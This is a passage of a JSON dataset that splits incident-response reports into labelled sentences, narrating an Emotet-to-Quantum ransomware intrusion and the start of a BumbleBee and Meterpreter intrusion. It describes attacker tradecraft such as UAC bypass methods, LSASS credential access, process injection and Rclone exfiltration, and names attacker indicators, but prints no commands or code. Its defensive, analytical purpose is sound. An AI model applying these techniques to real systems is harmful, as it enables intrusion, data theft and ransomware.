        "text": "On the domain controller, the threat actors conducted further discovery tasks running find.bat and p.bat , which executed AdFind active directory discovery and performed a ping sweep across the environment.",
        "type": "",
        "report": "r-dfir-6",
        "line": 20,
        "index": 4339
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S21",
        "text": "On one of the other targeted servers, the threat actors deployed Tactical RMM, a remote management agent, for additional access and persistence in the environment.",
        "type": "",
        "report": "r-dfir-6",
        "line": 21,
        "index": 4340
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S22",
        "text": "From this server, the threat actors were observed using Rclone to exfiltrate data from a file share server in the environment.",
        "type": "",
        "report": "r-dfir-6",
        "line": 22,
        "index": 4341
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S23",
        "text": "The Mega.io service was the location the stolen data was sent.",
        "type": "",
        "report": "r-dfir-6",
        "line": 23,
        "index": 4342
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S24",
        "text": "On the fifth day of the intrusion, the threat actors appeared again to try and exfiltrate some data from the mail server again using Rclone but this appeared to fail and the threat actors did not try to resolve the issue.",
        "type": "",
        "report": "r-dfir-6",
        "line": 24,
        "index": 4343
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S25",
        "text": "After this the threat actors went silent until the eighth and final day of the intrusion.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 25,
        "index": 4344
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S26",
        "text": "On the eighth day of the intrusion the threat actor accessed the environment using Tactical RMM to deploy Anydesk on the compromised host.",
        "type": "",
        "report": "r-dfir-6",
        "line": 26,
        "index": 4345
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S27",
        "text": "After establishing a connection using Anydesk, the threat actors then dropped SoftPerfect\u2019s Network Scanner and ran it to identify hosts across the environment.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 27,
        "index": 4346
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S28",
        "text": "From there, the threat actors began connecting to other hosts via RDP, including the a backup server.",
        "type": "",
        "report": "r-dfir-6",
        "line": 28,
        "index": 4347
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S29",
        "text": "After choosing a new server and connecting via RDP, the threat actors dropped Powertool64.exe and dontsleep.exe in preparation for their final actions.",
        "type": "",
        "report": "r-dfir-6",
        "line": 29,
        "index": 4348
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S30",
        "text": "Finally, locker.dll and a batch file 1.bat were dropped on the host and the batch file was executed beginning the Quantum rasomware deployment to all hosts over SMB.",
        "type": "",
        "report": "r-dfir-6",
        "line": 30,
        "index": 4349
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S31",
        "text": "From initial intrusion to ransomware deployment, 154 hours passed, over eight days.",
        "type": "",
        "report": "r-dfir-6",
        "line": 31,
        "index": 4350
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S32",
        "text": "After ransomware deployment, the threat actors remained connected and did RDP to a few other servers and executed ProcessHacker.exe and a net command.",
        "type": "",
        "report": "r-dfir-6",
        "line": 32,
        "index": 4351
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S33",
        "text": "With no other activity taking place, we assess that this was likely the threat actors confirming successful deployment of the ransomware payload across the network.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 33,
        "index": 4352
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S34",
        "text": "Initial access took the form of an LNK file delivered to a victim through a MalSpam campaign.",
        "type": "",
        "report": "r-dfir-6",
        "line": 34,
        "index": 4353
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S35",
        "text": "The Powershell script embedded within the LNK is a Base64 encoded script with various components split into different variables for obfuscation purposes.",
        "type": "",
        "report": "r-dfir-6",
        "line": 35,
        "index": 4354
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S36",
        "text": "The script will decode itself rather than depend on Powershell\u2019s built-in ability to execute encoded scripts.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 36,
        "index": 4355
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S37",
        "text": "The Powershell script, when double clicked (executed), will attempt to connect to a set of domains containing the Emotet malware.",
        "type": "",
        "report": "r-dfir-6",
        "line": 37,
        "index": 4356
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S38",
        "text": "Upon successful download of the Emotet malware, the PowerShell script will write it to a temporary directory and execute the payload via regsvr32.exe .\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 38,
        "index": 4357
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S39",
        "text": "It is interesting to note, the LNK identifies the machine it was created on through the NetBIOS name of black-dog and a MAC Address beginning with 08:00:27 indicating a system running on Virtualbox.",
        "type": "",
        "report": "r-dfir-6",
        "line": 39,
        "index": 4358
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S40",
        "text": "Once the PowerShell script from the LNK file executed successfully, Emotet began execution.",
        "type": "",
        "report": "r-dfir-6",
        "line": 40,
        "index": 4359
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S41",
        "text": "Emotet will initially copy itself to a randomly named folder in the users temporary folder.",
        "type": "",
        "report": "r-dfir-6",
        "line": 41,
        "index": 4360
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S42",
        "text": "Multiple instances of Emotet spawning itself was observed over a period of three days.",
        "type": "",
        "report": "r-dfir-6",
        "line": 42,
        "index": 4361
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S43",
        "text": "Almost all the instances of Emotet included three enumeration commands executed:\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 43,
        "index": 4362
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S44",
        "text": "Towards the third and fourth day of the intrusion, Cobalt Strike was dropped to disk as a PE executable and executed.",
        "type": "",
        "report": "r-dfir-6",
        "line": 44,
        "index": 4363
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S45",
        "text": "This access was used to perform enumeration and move laterally to other hosts.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 45,
        "index": 4364
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S46",
        "text": "The following diagram aims to provide an illustration of the execution chain with multiple instances of Emotet leading to Cobalt Strike.",
        "type": "",
        "report": "r-dfir-6",
        "line": 46,
        "index": 4365
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S47",
        "text": "The Emotet malware has used various persistence methods over time, an example can be seen here.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 47,
        "index": 4366
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S48",
        "text": "On the first day, Emotet established persistence via a run key.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 48,
        "index": 4367
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S49",
        "text": "As we can see, the regsvr32.exe Windows\u2019s native utility was used to launch the Emotet DLL.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 49,
        "index": 4368
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S50",
        "text": "After moving to the hands on keyboard phase of the intrusion, the threat actors proceeded to deploy several remote management tools across the environment.",
        "type": "",
        "report": "r-dfir-6",
        "line": 50,
        "index": 4369
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S51",
        "text": "Tactical RMM was the first tool chosen for deployment.",
        "type": "",
        "report": "r-dfir-6",
        "line": 51,
        "index": 4370
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S52",
        "text": "Tactical RMM is a remote management software platform that uses a combination of agents to allow for remote management and access to systems.",
        "type": "",
        "report": "r-dfir-6",
        "line": 52,
        "index": 4371
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S53",
        "text": "The file 17jun.exe, was deployed into the programdata folder on one of the servers.",
        "type": "",
        "report": "r-dfir-6",
        "line": 53,
        "index": 4372
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S54",
        "text": "This was then executed by the threat actors and resulted in the installation of the main RMM agent.",
        "type": "",
        "report": "r-dfir-6",
        "line": 54,
        "index": 4373
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S55",
        "text": "The install completed with the following command.",
        "type": "",
        "report": "r-dfir-6",
        "line": 55,
        "index": 4374
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S56",
        "text": "A service was also created for the agent.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 56,
        "index": 4375
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S57",
        "text": "A service was installed in the system.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 57,
        "index": 4376
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S58",
        "text": "Along with the tacticalrmm.exe client, a second executable called meshagent.exe, was installed to handle remote session interaction, and a separate service was created for that agent.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 58,
        "index": 4377
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S59",
        "text": "A service was installed in the system.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 59,
        "index": 4378
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S60",
        "text": "On the final day of the intrusion, the threat actors added AnyDesk to the same server running Tactical RMM, providing an additional means of access prior to the deployment of ransomware.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 60,
        "index": 4379
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S61",
        "text": "A service was installed in the system.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 61,
        "index": 4380
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S62",
        "text": "We suspect a failed ZeroLogon exploit was attempted against a domain controller, originating from the beachhead host with Cobalt Strike running on it.",
        "type": "",
        "report": "r-dfir-6",
        "line": 62,
        "index": 4381
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S63",
        "text": "One indicator is the \u2018mimikatz\u2019 string in the Netlogon event that is used by the Mimikatz Zerologon implementation.",
        "type": "",
        "report": "r-dfir-6",
        "line": 63,
        "index": 4382
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S64",
        "text": "During a period of a few seconds, multiple NetrServerReqChallenge and NetrServerAuthenticate2 methods in the traffic from a single source were observed, this is one of the indicators of a Zerologon attempt.",
        "type": "",
        "report": "r-dfir-6",
        "line": 64,
        "index": 4383
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S65",
        "text": "The threat actor was observed process injecting into legitimate process and using them to execute their own tasks on the system, this can be seen from Winlogon connecting to a domain associated with a Cobalt Strike server and removing files from the system.",
        "type": "",
        "report": "r-dfir-6",
        "line": 65,
        "index": 4384
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S66",
        "text": "The specific mechanism used to inject into a foreign process, was injecting arbitrary code into its memory space, and executing it as a remotely created thread.",
        "type": "",
        "report": "r-dfir-6",
        "line": 66,
        "index": 4385
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S67",
        "text": "This occurred from rundll32.exe, which was previously used to execute and run Cobalt Strike.",
        "type": "",
        "report": "r-dfir-6",
        "line": 67,
        "index": 4386
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S68",
        "text": "The following table summarizes the processes used for injection during this case:\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 68,
        "index": 4387
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S69",
        "text": "PowerTool was observed, dropped and executed on the server used to deploy the ransomware payload.",
        "type": "",
        "report": "r-dfir-6",
        "line": 69,
        "index": 4388
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S70",
        "text": "This tool has the ability to kill a process, delete its process file, unload drivers, and delete the driver files.",
        "type": "",
        "report": "r-dfir-6",
        "line": 70,
        "index": 4389
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S71",
        "text": "It has been reportedly used by several ransomware groups to aid in their operations [1][2][3][4].\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 71,
        "index": 4390
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S72",
        "text": "As a byproduct of execution, PowerTool will drop a driver to disk and load it into the system.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 72,
        "index": 4391
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S73",
        "text": "The threat actor was observed deleting files that had been dropped to disk.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 73,
        "index": 4392
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S74",
        "text": "Process access to LSASS was observed, likely to dump credentials from a process that was injected with Cobalt Strike.",
        "type": "",
        "report": "r-dfir-6",
        "line": 74,
        "index": 4393
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S75",
        "text": "The Granted Access level matches know indicators for Mimikatz with an access value of 0x1010 (4112), as we covered in a prior report.",
        "type": "",
        "report": "r-dfir-6",
        "line": 75,
        "index": 4394
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S76",
        "text": "We also observed a Cobalt Strike executable request access level of 0x0040 (64) to LSASS, as well indicating other credential access tools may have been in use by the threat actor.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 76,
        "index": 4395
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S77",
        "text": "During the initial Emotet execution, three automated discovery commands were observed.",
        "type": "",
        "report": "r-dfir-6",
        "line": 77,
        "index": 4396
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S78",
        "text": "These were then repeated, seen occurring once a day from the Emotet host.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 78,
        "index": 4397
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S79",
        "text": "Multiple commands responsible for enumerating Active Directory groups, domain joined computers, and domain trusts, were executed via Cobalt Strike on the beachhead.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 79,
        "index": 4398
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S80",
        "text": "The threat actor was observed querying a non-existent group Domain controller, followed by a command correcting the mistake that queried the group Domain controllers .\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 80,
        "index": 4399
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S81",
        "text": "A ping command issued to a user workstation and a domain controller were observed moments before lateral movement was attempted.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 81,
        "index": 4400
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S82",
        "text": "Invoke-ShareFinder was observed being used via Powershell in the environment from an injected process with Cobalt Strike:\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 82,
        "index": 4401
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S83",
        "text": "In addition to the Invoke-ShareFinder command, other functions that were used by the script were also observed.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 83,
        "index": 4402
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S84",
        "text": "The remnants of Invoke-ShareFinder could also be seen on the network through the consistent querying of \u201cADMIN$\u201d and \u201cC$\u201d shares for each host over a short period of time.",
        "type": "",
        "report": "r-dfir-6",
        "line": 84,
        "index": 4403
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S85",
        "text": "In addition to these shares, a few shares from the file servers were also accessed.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 85,
        "index": 4404
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S86",
        "text": "Once on the domain controller, two batch files were run.",
        "type": "",
        "report": "r-dfir-6",
        "line": 86,
        "index": 4405
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S87",
        "text": "The first find.bat was used to run AdFind.exe for Active Directory discovery.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 87,
        "index": 4406
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S88",
        "text": "The second script, p.bat, was run to sweep the network using ping, looking for network connectivity and online hosts.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 88,
        "index": 4407
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S89",
        "text": "On the final day, prior to ransom deployment, the threat actor also dropped netscan.exe on the server, and executed it from the Tactical RMM meshagent.exe session.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 89,
        "index": 4408
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S90",
        "text": "The threat actor was observed creating remote services in order to execute beacon DLL files transferred via SMB as SYSTEM on remote hosts.",
        "type": "",
        "report": "r-dfir-6",
        "line": 90,
        "index": 4409
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S91",
        "text": "In another instance, an executable Cobalt Strike beacon was copied via SMB to a target machine, and then executed via WMI.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 91,
        "index": 4410
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S92",
        "text": "Lastly, traces of RDP (Remote Desktop Protocol) connections were discovered on multiple compromised hosts utilized for lateral movement on the final day of the intrusion and during the ransomware deployment.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 92,
        "index": 4411
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S93",
        "text": "On the third day of the intrusion, after moving laterally, the threat actors began to review sensitive documents stored on network shares, including revenue, insurance, and password storage documents.",
        "type": "",
        "report": "r-dfir-6",
        "line": 93,
        "index": 4412
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S94",
        "text": "These documents were again reviewed by the threat actor on the final day of the intrusion.",
        "type": "",
        "report": "r-dfir-6",
        "line": 94,
        "index": 4413
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S95",
        "text": "Later the threat actor viewed the stolen files off network, observed by triggered canary tokens, which revealed connections from an AWS EC2 instance.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 95,
        "index": 4414
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S96",
        "text": "The Emotet loader pulled the main second stage payload from the following domains:\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 96,
        "index": 4415
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S97",
        "text": "The second stage loader had multiple IP addresses in its configuration to attempt connections to:\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 97,
        "index": 4416
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S98",
        "text": "The following Cobalt Strike C2 servers were observed being used.",
        "type": "",
        "report": "r-dfir-6",
        "line": 98,
        "index": 4417
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S99",
        "text": "Both HTTP and HTTPS were observed to be used.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 99,
        "index": 4418
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S100",
        "text": "The following are the Cobalt Strike configurations observed:\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 100,
        "index": 4419
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S101",
        "text": "The threat actor dropped a Tactical RMM Agent on one of the servers as an alternative command and control avenue to access the network.",
        "type": "",
        "report": "r-dfir-6",
        "line": 101,
        "index": 4420
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S102",
        "text": "During the installation of the software, the following command was observed:\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 102,
        "index": 4421
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S103",
        "text": "This command reveals the floppasoftware.com domain used by the threat actor for the remote management of Tactical RMM Agent.",
        "type": "",
        "report": "r-dfir-6",
        "line": 103,
        "index": 4422
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S104",
        "text": "This domain was registered very close to the timeline of this incident.",
        "type": "",
        "report": "r-dfir-6",
        "line": 104,
        "index": 4423
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S105",
        "text": "A domain registered to be used with Tactical RMM Agent will have both an api and mesh subdomain, in this case api.floppasoftware[.]com and mesh.floppasoftware[.]com .",
        "type": "",
        "report": "r-dfir-6",
        "line": 105,
        "index": 4424
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S106",
        "text": "These were both hosted on the same server IP: 212.73.150.62.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 106,
        "index": 4425
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S107",
        "text": "In addition, during the execution of Tactical RMM Agent, the software will reach out to a centralized domain in order to retrieve the current public IP address in use:\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 107,
        "index": 4426
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S108",
        "text": "On the final day of the intrusion, AnyDesk was deployed on the server they had previously installed Tactical RMM on.",
        "type": "",
        "report": "r-dfir-6",
        "line": 108,
        "index": 4427
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S109",
        "text": "Using this RMM agent they proceeded to install AnyDesk on the host.",
        "type": "",
        "report": "r-dfir-6",
        "line": 109,
        "index": 4428
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S110",
        "text": "The following process activity was observed from meshagent.exe.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 110,
        "index": 4429
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S111",
        "text": "The decoded base 64 content reveals commands for console access and connect actions.",
        "type": "",
        "report": "r-dfir-6",
        "line": 111,
        "index": 4430
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S112",
        "text": "This is then followed by the following process flow:\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 112,
        "index": 4431
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S113",
        "text": "Once downloaded and installed, the threat actor initiated a connection to the AnyDesk host.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 113,
        "index": 4432
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S114",
        "text": "Also seen in our last report on Emotet, threat actors leveraged Rclone to exfiltrate data to Mega (Mega.nz) storage services.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 114,
        "index": 4433
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S115",
        "text": "From the rclone.conf file, the threat actors left the details of the remote account being used.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 115,
        "index": 4434
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S116",
        "text": "With the help of Netflow, we identified that at least ~250MB worth of data was exfiltrated out of the environment.",
        "type": "",
        "report": "r-dfir-6",
        "line": 116,
        "index": 4435
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S117",
        "text": "During the first two days, Emotet sent outbound spam emails over SMTP:\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 117,
        "index": 4436
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S118",
        "text": "The following is an example of the SMTP traffic for sending the email, along with an extracted EML that was sent with an attached XLS:\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 118,
        "index": 4437
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S119",
        "text": "Towards the last day of the intrusion, the threat actor made their preparations to deploy ransomware to the domain.",
        "type": "",
        "report": "r-dfir-6",
        "line": 119,
        "index": 4438
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S120",
        "text": "They started by connecting to a new server via RDP from the server they just used Tactical RMM to deploy Anydesk.",
        "type": "",
        "report": "r-dfir-6",
        "line": 120,
        "index": 4439
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S121",
        "text": "Once establishing the RDP connection, they deployed Powertool64.exe, likely to prevent intervention by any security tools and launched the software Don\u2019t Sleep.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 121,
        "index": 4440
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S122",
        "text": "Don\u2019t Sleep has the capability to keep the computer from being shutdown and the user from being signed off.",
        "type": "",
        "report": "r-dfir-6",
        "line": 122,
        "index": 4441
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S123",
        "text": "This was likely done to ensure nothing will interfere with the propagation of the ransomware payload.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 123,
        "index": 4442
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S124",
        "text": "Finally, with Don\u2019t Sleep running, the threat actor executed a batch script named \u201c1.bat\u201c.",
        "type": "",
        "report": "r-dfir-6",
        "line": 124,
        "index": 4443
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S125",
        "text": "The script invoked the main ransomware payload, locker.dll, and passed a list of all the computers in the domain to the target parameter.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 125,
        "index": 4444
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S126",
        "text": "The executable began to encrypt all the targeted hosts in the environment and dropped a ransom note: README_TO_DECRYPT.html\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 126,
        "index": 4445
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S127",
        "text": "After the invocation of the ransomware payload, about a minute later, the threat actor launched Process Hacker.",
        "type": "",
        "report": "r-dfir-6",
        "line": 127,
        "index": 4446
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S128",
        "text": "We believe this was to monitor the execution of the ransomware payload.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 128,
        "index": 4447
    },
    {
        "id": "dfir-reports-filtered/r-dfir-6.md:::S129",
        "text": "All systems in the domain were encrypted and presented with a ransom message.\n",
        "type": "",
        "report": "r-dfir-6",
        "line": 129,
        "index": 4448
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S0",
        "text": "The intrusion started with a contact form on a website.",
        "type": "",
        "report": "r-dfir-7",
        "line": 0,
        "index": 4449
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S1",
        "text": "It has been reported that this delivery method has been in use for intrusions since at least 2020.",
        "type": "",
        "report": "r-dfir-7",
        "line": 1,
        "index": 4450
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S2",
        "text": "This campaign took place in May, and appears to have run as late as June 2022, based on OSINT data related to similar delivery fingerprints.",
        "type": "",
        "report": "r-dfir-7",
        "line": 2,
        "index": 4451
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S3",
        "text": "The contact form gets filled out by the threat actor with a Copyright notice, purporting a violation of the Digital Millennium Copyright Act (DMCA).",
        "type": "",
        "report": "r-dfir-7",
        "line": 3,
        "index": 4452
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S4",
        "text": "It then encourages the recipient to download a file showing the purported violation.\n",
        "type": "",
        "report": "r-dfir-7",
        "line": 4,
        "index": 4453
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S5",
        "text": "Upon the user clicking the link, they arrive at a \u201cGoogle\u201d storage site on storage.googleapis.com.",
        "type": "",
        "report": "r-dfir-7",
        "line": 5,
        "index": 4454
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S6",
        "text": "A zip file is then downloaded to the victim machine and once unzipped the user is presented with an ISO file.",
        "type": "",
        "report": "r-dfir-7",
        "line": 6,
        "index": 4455
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S7",
        "text": "The ISO contains a LNK file and a DLL file.",
        "type": "",
        "report": "r-dfir-7",
        "line": 7,
        "index": 4456
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S8",
        "text": "When the LNK is double-clicked, the BumbleBee DLL is executed via rundll32.",
        "type": "",
        "report": "r-dfir-7",
        "line": 8,
        "index": 4457
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S9",
        "text": "Initially, contact was made with BumbleBee command and control servers but little other early activity was observed.",
        "type": "",
        "report": "r-dfir-7",
        "line": 9,
        "index": 4458
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S10",
        "text": "Approximately 12 hours later, ImagingDevices.exe was launched via WmiPrivse.exe and a Meterpreter agent was injected into the process, like we have observed in previous reports.",
        "type": "",
        "report": "r-dfir-7",
        "line": 10,
        "index": 4459
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S11",
        "text": "This process then utilized nltest, net, tasklist, and whoami to perform reconnaissance.",
        "type": "",
        "report": "r-dfir-7",
        "line": 11,
        "index": 4460
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S12",
        "text": "About 37 minutes after launching ImagingDevices.exe, the Meterpreter agent migrated to svchost.exe.",
        "type": "",
        "report": "r-dfir-7",
        "line": 12,
        "index": 4461
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S13",
        "text": "Upon migrating to the svchost process, there were attempts to bypass UAC and launch a Meterpreter executable.",
        "type": "",
        "report": "r-dfir-7",
        "line": 13,
        "index": 4462
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S14",
        "text": "Several failed attempts to bypass UAC occurred, utilizing the WSReset method, followed by a failed attempt to bypass UAC utilizing the slui hijacking method.",
        "type": "",
        "report": "r-dfir-7",
        "line": 14,
        "index": 4463
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S15",
        "text": "Finally, the threat actors succeeded on their final attempt, using the WSReset method.",
        "type": "",
        "report": "r-dfir-7",
        "line": 15,
        "index": 4464
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S16",
        "text": "Once UAC was bypassed, Meterpreter\u2019s getsystem command was successfully employed.",
        "type": "",
        "report": "r-dfir-7",
        "line": 16,
        "index": 4465
    },
    {
        "id": "dfir-reports-filtered/r-dfir-7.md:::S17",
